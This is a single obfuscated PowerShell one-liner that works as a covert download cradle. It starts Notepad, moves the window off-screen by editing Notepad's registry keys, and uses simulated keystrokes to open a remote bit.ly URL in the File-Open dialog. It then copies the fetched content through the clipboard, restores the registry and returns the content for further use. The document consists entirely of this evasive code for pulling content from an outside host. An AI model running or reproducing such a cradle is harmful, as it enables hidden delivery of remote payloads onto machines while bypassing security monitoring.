$wshell=New-Object -ComObject WScript.Shell;$app='Notepad';$reg='HKCU:\Software\Microsoft\Notepad';$url='http://bit.ly/L3g1tCrad1e';[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');$props=(GP $reg);@(@('iWindowPosY',([String]([Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (GI Variable:\_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=Process|Where-Object{(GI Variable:\_).Value.id-eq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'{ENTER}')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -le 1){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((GI Variable:\_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(Process|Where-Object{(GI Variable:\_).Value.id-eq$curpid}){@('{TAB}','{ENTER}')|ForEach{$wshell.SendKeys((GI Variable:\_).Value)}};@('iWindowPosY','iWindowPosDY','iWindowPosDX','StatusBar','iWindowPosX')|ForEach{Set-ItemProperty $reg (GI Variable:\_).Value $props.((Variable _).Value)};$res
